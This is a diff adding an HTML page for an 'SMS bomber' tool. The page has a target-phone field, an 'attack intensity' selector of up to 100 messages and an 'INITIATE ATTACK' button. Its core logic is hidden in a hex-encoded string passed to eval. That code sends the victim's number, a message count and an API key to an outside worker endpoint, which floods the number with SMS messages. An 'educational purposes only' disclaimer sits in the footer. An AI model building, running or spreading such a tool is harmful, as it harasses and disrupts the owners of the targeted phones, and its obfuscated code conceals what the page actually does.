@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>M1 SMS BOMBER-v1.0</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #000000;
+            --surface-color: #111111;
+            --border-color: #333333;
+            --primary-accent: #ffffff;
+            --secondary-accent: #888888;
+            --danger-color: #ff0000;
+            --success-color: #00ff00;
+            --text-color: #ffffff;
+            --text-muted: #aaaaaa;
+            --font-mono: 'Fira Code', monospace;
+            --glow-primary: rgba(255, 255, 255, 0.3);
+            --glow-secondary: rgba(136, 136, 136, 0.2);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            background-image: 
+                /* Gojo Satoru image background */
+                url('https://images.unsplash.com/photo-1613336026275-d6d473084e85?auto=format&fit=crop&w=1920'),
+                /* Grid pattern background */
+                linear-gradient(0deg, transparent 24%, rgba(255, 255, 255, 0.05) 25%, rgba(255, 255, 255, 0.05) 26%, transparent 27%, transparent 74%, rgba(255, 255, 255, 0.05) 75%, rgba(255, 255, 255, 0.05) 76%, transparent 77%, transparent),
+                linear-gradient(90deg, transparent 24%, rgba(255, 255, 255, 0.05) 25%, rgba(255, 255, 255, 0.05) 26%, transparent 27%, transparent 74%, rgba(255, 255, 255, 0.05) 75%, rgba(255, 255, 255, 0.05) 76%, transparent 77%, transparent);
+            background-size: cover, 50px 50px, 50px 50px;
+            background-position: center;
+            background-blend-mode: overlay;
+            background-repeat: no-repeat;
+            animation: gridMove 20s linear infinite;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85); /* Dark overlay for better readability */
+            z-index: -1;
+        }
+        
+        @keyframes gridMove {
+            0% { background-position: center, 0 0, 0 0; }
+            100% { background-position: center, 50px 50px, 50px 50px; }
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 10px var(--glow-primary); }
+            50% { box-shadow: 0 0 20px var(--glow-primary), 0 0 30px var(--glow-secondary); }
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @keyframes borderFlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .spinner {
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-top: 2px solid var(--primary-accent);
+            border-radius: 50%;
+            width: 25px;
+            height: 25px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        
+        .site-header {
+            text-align: center;
+            margin-bottom: 40px;
+            animation: slideIn 0.8s ease-out;
+            position: relative;
+            padding: 20px;
+            border-bottom: 1px solid var(--border-color);
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px);
+            width: 100%;
+            max-width: 850px;
+        }
+        
+        .site-header h1 {
+            font-family: var(--font-mono);
+            font-size: 2.5rem;
+            font-weight: 600;
+            color: var(--primary-accent);
+            margin-bottom: 10px;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            position: relative;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        .site-header h1::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 2px;
+            background: var(--primary-accent);
+            animation: pulse 2s infinite;
+        }
+        
+        .site-header p {
+            font-family: var(--font-mono);
+            color: var(--text-muted);
+            font-size: 1rem;
+            animation: pulse 3s infinite;
+            letter-spacing: 2px;
+        }
+        
+        .control-panel-container {
+            background-color: rgba(17, 17, 17, 0.9);
+            border-radius: 0;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            max-width: 850px;
+            width: 100%;
+            border: 2px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+            animation: slideIn 1s ease-out;
+            backdrop-filter: blur(10px);
+        }
+        
+        .control-panel-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary-accent), transparent);
+            animation: borderFlow 3s linear infinite;
+        }
+        
+        .form-controls {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            position: relative;
+            animation: slideIn 0.6s ease-out both;
+        }
+        
+        .form-group:nth-child(1) { animation-delay: 0.4s; }
+        .form-group:nth-child(2) { animation-delay: 0.6s; }
+        
+        .form-group label {
+            display: block;
+            font-family: var(--font-mono);
+            font-weight: 500;
+            margin-bottom: 12px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            border-left: 2px solid var(--primary-accent);
+            padding-left: 10px;
+        }
+        
+        .form-group input[type="tel"],
+        .form-group input[type="number"] {
+            width: 100%;
+            padding: 14px 14px 14px 40px;
+            border: 1px solid var(--border-color);
+            border-radius: 0;
+            font-family: 'Poppins', sans-serif;
+            font-size: 1rem;
+            background: rgba(0, 0, 0, 0.7);
+            color: var(--text-color);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 1px;
+            backdrop-filter: blur(5px);
+        }
+        
+        .form-group::before {
+            content: '>';
+            position: absolute;
+            left: 18px;
+            top: 47px;
+            font-family: var(--font-mono);
+            color: var(--primary-accent);
+            font-weight: bold;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary-accent);
+            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .intensity-control {
+            display: flex;
+            border-radius: 0;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+        }
+        
+        .intensity-control input[type="radio"] {
+            display: none;
+        }
+        
+        .intensity-control label {
+            flex: 1;
+            padding: 14px;
+            text-align: center;
+            cursor: pointer;
+            font-family: var(--font-mono);
+            background: transparent;
+            color: var(--text-muted);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            border-right: 1px solid var(--border-color);
+        }
+        
+        .intensity-control label:last-child {
+            border-right: none;
+        }
+        
+        .intensity-control label:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text-color);
+        }
+        
+        .intensity-control input[type="radio"]:checked + label {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--primary-accent);
+            font-weight: 700;
+            border-bottom: 2px solid var(--primary-accent);
+        }
+        
+        #trigger-btn {
+            border: 1px solid var(--primary-accent);
+            padding: 18px 30px;
+            border-radius: 0;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-top: 20px;
+            background: transparent;
+            color: var(--primary-accent);
+            position: relative;
+            overflow: hidden;
+            animation: slideIn 0.8s ease-out 0.8s both;
+            backdrop-filter: blur(5px);
+        }
+        
+        #trigger-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.6s;
+        }
+        
+        #trigger-btn:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.05);
+            letter-spacing: 4px;
+            transform: translateY(-2px);
+        }
+        
+        #trigger-btn:hover:not(:disabled)::before {
+            left: 100%;
+        }
+        
+        #trigger-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+        
+        #trigger-btn:disabled {
+            border-color: var(--text-muted);
+            color: var(--text-muted);
+            cursor: not-allowed;
+            opacity: 0.6;
+            transform: none;
+        }
+        
+        .results-area {
+            margin-top: 35px;
+            text-align: left;
+            animation: slideIn 0.8s ease-out 1s both;
+            border-top: 1px solid var(--border-color);
+            padding-top: 20px;
+        }
+        
+        #system-log-live {
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            min-height: 150px;
+            max-height: 300px;
+            overflow-y: auto;
+            border-radius: 0;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid var(--border-color);
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            backdrop-filter: blur(5px);
+        }
+        
+        #system-log-live .log-entry {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(51, 51, 51, 0.5);
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        #system-log-live::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        #system-log-live::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 0;
+        }
+        
+        #system-log-live::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 0;
+        }
+        
+        .result-summary {
+            margin-top: 25px;
+            display: flex;
+            justify-content: space-around;
+            text-align: center;
+            font-family: var(--font-mono);
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid var(--border-color);
+            border-radius: 0;
+            animation: slideIn 0.5s ease-out;
+            backdrop-filter: blur(5px);
+        }
+        
+        .summary-item {
+            padding: 10px;
+            border-radius: 0;
+            transition: all 0.3s ease;
+            flex: 1;
+            margin: 0 10px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .summary-item:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary-accent);
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .summary-item strong {
+            display: block;
+            font-size: 1.8rem;
+            margin-bottom: 5px;
+            color: var(--primary-accent);
+        }
+        
+        .summary-item .success {
+            color: var(--success-color);
+        }
+        
+        .summary-item .failure {
+            color: var(--danger-color);
+        }
+        
+        .site-footer {
+            margin-top: 50px;
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            animation: slideIn 0.8s ease-out 1.2s both;
+            padding: 20px;
+            border-top: 1px solid var(--border-color);
+            width: 100%;
+            max-width: 850px;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px);
+        }
+        
+        .site-footer p {
+            margin-bottom: 10px;
+            opacity: 0.8;
+            letter-spacing: 1px;
+        }
+        
+        .site-footer a {
+            color: var(--primary-accent);
+            text-decoration: none;
+            font-weight: 500;
+            position: relative;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+        }
+        
+        .site-footer a::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: var(--primary-accent);
+            transition: width 0.3s ease;
+        }
+        
+        .site-footer a:hover {
+            letter-spacing: 2px;
+        }
+        
+        .site-footer a:hover::after {
+            width: 100%;
+        }
+        
+        .pulse-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--success-color);
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .fade-in {
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        /* Smooth transitions for all interactive elements */
+        button, input, label {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        /* Focus styles for accessibility */
+        *:focus {
+            outline: 2px solid var(--primary-accent);
+            outline-offset: 2px;
+        }
+        
+        /* Loading animation */
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        
+        .loading-bar {
+            width: 100%;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.1);
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        
+        .loading-fill {
+            height: 100%;
+            background: var(--primary-accent);
+            width: 0%;
+            animation: loading 2s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login overlay removed -->
+    
+    <header class="site-header">
+        <h1>M1 SMS BOMBER-v1.0</h1>
+        <p>//JOIN OUR WHATSAPP CHANNEL</p>
+    </header>
+    
+    <main class="control-panel-container" id="mainContent">
+        <div class="form-controls">
+            <div class="form-group">
+                <label for="recipient-number">TARGET_NODE [Phone Number]</label>
+                <input type="tel" id="recipient-number" placeholder="e.g., 923xxxxxxxxx">
+            </div>
+            
+            <div class="form-group">
+                <label>ATTACK_INTENSITY</label>
+                <div class="intensity-control" id="intensity-selector">
+                    <input type="radio" id="intensity-low" name="intensity" value="10" checked>
+                    <label for="intensity-low">Low (10)</label>
+                    <input type="radio" id="intensity-normal" name="intensity" value="25">
+                    <label for="intensity-normal">Normal (25)</label>
+                    <input type="radio" id="intensity-high" name="intensity" value="50">
+                    <label for="intensity-high">High (50)</label>
+                    <input type="radio" id="intensity-extreme" name="intensity" value="100">
+                    <label for="intensity-extreme">Extreme (100)</label>
+                </div>
+            </div>
+        </div>
+        
+        <button id="trigger-btn">INITIATE ATTACK</button>
+        
+        <div class="results-area">
+            <label>SYSTEM_LOG <span class="pulse-dot"></span></label>
+            <div id="system-log-live"></div>
+        </div>
+    </main>
+    
+    <footer class="site-footer">
+        <p>© 2026 M1. All Rights Reserved.</p>
+        <p>Disclaimer: This tool is for educational purposes only. Use responsibly.</p>
+        <p><a href="https://whatsapp.com/channel/0029Vb7bRaeAYlUTWchwPV44" target="_blank">WhatsApp Channel</a></p>
+    </footer>
+
+    <script>
+        // Original script (UNCHANGED - API structure preserved)
+        (function(_0xf381f2){
+            var _0x6febce='';
+            for(var i=0;i<_0xf381f2.length;i+=2){
+                _0x6febce+=String.fromCharCode(parseInt(_0xf381f2.substr(i,2),16));
+            }
+            eval(_0x6febce);
+        }('0a20202020636f6e737420534d534d6174726978203d207b0a2020202020202020696e69742829207b0a202020202020202020202020746869732e7569203d207b0a20202020202020202020202020202020726563697069656e74496e7075743a20646f63756d656e742e676574456c656d656e74427949642827726563697069656e742d6e756d62657227292c0a202020202020202020202020202020207472696767657242746e3a20646f63756d656e742e676574456c656d656e74427949642827747269676765722d62746e27292c0a2020202020202020202020202020202073797374656d4c6f673a20646f63756d656e742e676574456c656d656e7442794964282773797374656d2d6c6f672d6c69766527292c0a2020202020202020202020207d3b0a202020202020202020202020746869732e4150495f424153455f55524c203d202768747470733a2f2f66616b2d736d732d626f6f6d6265722e6a6f6b65726b6565703035372e776f726b6572732e6465762f273b0a202020202020202020202020746869732e4150495f4b4559203d20273332353633273b0a2020202020202020202020200a202020202020202020202020746869732e73657475704576656e744c697374656e65727328293b0a202020202020202020202020746869732e6c6f674d657373616765282753595354454d204c4f473a205374616e6462792e204177616974696e67207573657220696e7075742e2e2e27293b0a20202020202020207d2c0a0a202020202020202073657475704576656e744c697374656e6572732829207b0a202020202020202020202020746869732e75692e7472696767657242746e2e6164644576656e744c697374656e65722827636c69636b272c202829203d3e20746869732e737461727450726f636573732829293b0a20202020202020207d2c0a0a20202020202020206c6f674d65737361676528746578742c2074797065203d2027494e464f2729207b0a202020202020202020202020636f6e737420656e747279203d20646f63756d656e742e637265617465456c656d656e74282764697627293b0a202020202020202020202020656e7472792e636c6173734e616d65203d20276c6f672d656e747279273b0a2020202020202020202020206c657420636f6c6f72203d2027766172282d2d746578742d6d7574656429273b0a2020202020202020202020206966202874797065203d3d3d202753554343455353272920636f6c6f72203d2027766172282d2d737563636573732d636f6c6f7229273b0a2020202020202020202020206966202874797065203d3d3d20274552524f52272920636f6c6f72203d2027766172282d2d64616e6765722d636f6c6f7229273b0a202020202020202020202020656e7472792e7374796c652e636f6c6f72203d20636f6c6f723b0a202020202020202020202020656e7472792e74657874436f6e74656e74203d20603e20247b747970657d3a20247b746578747d603b0a202020202020202020202020746869732e75692e73797374656d4c6f672e617070656e644368696c6428656e747279293b0a202020202020202020202020746869732e75692e73797374656d4c6f672e7363726f6c6c546f70203d20746869732e75692e73797374656d4c6f672e7363726f6c6c4865696768743b0a20202020202020207d2c0a20202020202020200a2020202020202020736574427574746f6e53746174652869734c6f6164696e6729207b0a202020202020202020202020746869732e75692e7472696767657242746e2e64697361626c6564203d2069734c6f6164696e673b0a202020202020202020202020746869732e75692e7472696767657242746e2e696e6e657248544d4c203d2069734c6f6164696e67203f20273c64697620636c6173733d227370696e6e65722022207374796c653d226d617267696e3a2030206175746f3b223e3c2f6469763e27203a2027494e4954494154452041545441434b273b0a20202020202020207d2c0a0a2020202020202020646973706c617953756d6d617279286461746129207b0a202020202020202020202020636f6e73742073756d6d617279446976203d20646f63756d656e742e637265617465456c656d656e74282764697627293b0a20202020202020202020202073756d6d6172794469762e636c6173734e616d65203d2027726573756c742d73756d6d617279273b0a20202020202020202020202073756d6d6172794469762e696e6e657248544d4c203d20600a202020202020202020202020202020203c64697620636c6173733d2273756d6d6172792d6974656d223e0a20202020202020202020202020202020202020203c7374726f6e6720636c6173733d2273756363657373223e247b646174612e73756363657373436f756e747d3c2f7374726f6e673e0a20202020202020202020202020202020202020203c7370616e3e535543434553533c2f7370616e3e0a202020202020202020202020202020203c2f6469763e0a202020202020202020202020202020203c64697620636c6173733d2273756d6d6172792d6974656d223e0a20202020202020202020202020202020202020203c7374726f6e6720636c6173733d226661696c757265223e247b646174612e6661696c757265436f756e747d3c2f7374726f6e673e0a20202020202020202020202020202020202020203c7370616e3e4641494c5552453c2f7370616e3e0a202020202020202020202020202020203c2f6469763e0a202020202020202020202020202020203c64697620636c6173733d2273756d6d6172792d6974656d223e0a20202020202020202020202020202020202020203c7374726f6e673e247b646174612e746f74616c52657175657374737d3c2f7374726f6e673e0a20202020202020202020202020202020202020203c7370616e3e544f54414c3c2f7370616e3e0a202020202020202020202020202020203c2f6469763e0a202020202020202020202020603b0a202020202020202020202020746869732e75692e73797374656d4c6f672e617070656e644368696c642873756d6d617279446976293b0a20202020202020207d2c0a0a20202020202020206173796e6320737461727450726f636573732829207b0a202020202020202020202020636f6e737420726563697069656e744e756d626572203d20746869732e75692e726563697069656e74496e7075742e76616c75652e7472696d28293b0a202020202020202020202020636f6e737420636f756e74203d20646f63756d656e742e717565727953656c6563746f722827696e7075745b6e616d653d22696e74656e73697479225d3a636865636b656427292e76616c75653b0a0a2020202020202020202020206966202821726563697069656e744e756d626572207c7c20212f5e5c647b31302c31347d242f2e7465737428726563697069656e744e756d6265722929207b0a20202020202020202020202020202020746869732e6c6f674d6573736167652827496e76616c696420546172676574204e6f6465202831302d313420646967697473207265717569726564292e272c20274552524f5227293b0a2020202020202020202020202020202072657475726e3b0a2020202020202020202020207d0a0a202020202020202020202020746869732e736574427574746f6e53746174652874727565293b0a202020202020202020202020746869732e75692e73797374656d4c6f672e696e6e657248544d4c203d2027273b0a202020202020202020202020746869732e6c6f674d6573736167652860496e697469616c697a696e672061747461636b206f6e206e6f646520247b726563697069656e744e756d6265727d207769746820247b636f756e747d207061636b6574732e2e2e60293b0a202020202020202020202020746869732e6c6f674d657373616765282754686973206d61792074616b652061206d6f6d656e742e2054686520776f726b65722069732070726f63657373696e6720616c6c2072657175657374732e27293b0a2020202020202020202020200a202020202020202020202020747279207b0a20202020202020202020202020202020636f6e73742061706955726c203d2060247b746869732e4150495f424153455f55524c7d3f6b65793d247b746869732e4150495f4b45597d266e756d6265723d247b726563697069656e744e756d6265727d26636f756e743d247b636f756e747d603b0a20202020202020202020202020202020636f6e737420726573706f6e7365203d2061776169742066657463682861706955726c293b0a20202020202020202020202020202020636f6e73742064617461203d20617761697420726573706f6e73652e6a736f6e28293b0a0a202020202020202020202020202020206966202821726573706f6e73652e6f6b207c7c2021646174612e7375636365737329207b0a20202020202020202020202020202020202020207468726f77206e6577204572726f7228646174612e6572726f72207c7c2027546865204150492072657475726e656420616e20756e6578706563746564206572726f722e27293b0a202020202020202020202020202020207d0a202020202020202020202020202020200a20202020202020202020202020202020746869732e6c6f674d6573736167652860416c6c20247b646174612e746f74616c52657175657374737d207061636b657473207472616e736d69747465642e20416e616c797a696e6720726573756c74732e2e2e602c20275355434345535327293b0a20202020202020202020202020202020746869732e646973706c617953756d6d6172792864617461293b0a0a2020202020202020202020207d20636174636820286572726f7229207b0a20202020202020202020202020202020636f6e736f6c652e6572726f722822415049204572726f723a222c206572726f72293b0a20202020202020202020202020202020746869732e6c6f674d65737361676528604120637269746963616c206572726f72206f636375727265643a20247b6572726f722e6d6573736167657d602c20274552524f5227293b0a2020202020202020202020207d2066696e616c6c79207b0a20202020202020202020202020202020746869732e736574427574746f6e53746174652866616c7365293b0a2020202020202020202020207d0a20202020202020207d0a202020207d3b0a0a20202020646f63756d656e742e6164644576656e744c697374656e65722827444f4d436f6e74656e744c6f61646564272c202829203d3e20534d534d61747269782e696e69742829293b0a'));
+    </script>
+</body>
+</html>
